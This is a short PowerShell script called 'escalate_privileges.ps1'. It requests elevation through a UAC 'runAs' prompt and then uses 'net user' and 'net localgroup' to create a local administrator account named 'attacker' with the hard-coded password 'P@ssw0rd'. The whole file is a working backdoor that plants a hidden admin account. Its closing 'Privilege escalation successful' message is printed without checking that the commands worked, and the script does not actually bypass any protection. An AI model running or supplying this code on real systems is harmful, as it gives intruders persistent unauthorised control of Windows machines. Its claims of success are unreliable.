# escalate_privileges.ps1

# Function to check if the script is running with Administrator privileges
$adminCheck = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
if (-not ($adminCheck.IsInRole($adminRole))) {
    Write-Host "Not running with administrator privileges. Attempting to elevate..."
    Start-Process powershell -Verb runAs -ArgumentList $myInvocation.Line
    exit
}

# Example: Attempt to add a new admin user if privileges are available
$adminUser = "attacker"
$password = "P@ssw0rd"
$command = "net user $adminUser $password /add"
Invoke-Expression $command
$command2 = "net localgroup administrators $adminUser /add"
Invoke-Expression $command2

Write-Host "Privilege escalation successful. New user '$adminUser' added to administrators group."
